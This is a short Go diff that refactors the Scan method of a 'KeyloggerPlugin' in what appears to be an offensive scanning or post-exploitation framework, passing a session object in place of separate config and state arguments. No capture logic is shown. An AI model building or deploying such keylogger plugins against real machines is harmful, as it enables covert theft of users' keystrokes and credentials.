@@ -36,7 +36,8 @@ func NewKeyloggerPlugin() *KeyloggerPlugin {
 }
 
 // Scan 执行键盘记录 - 直接实现
-func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, config *common.Config, state *common.State) *plugins.Result {
+func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
+	config := session.Config
 	var output strings.Builder
 
 	// 从config获取配置
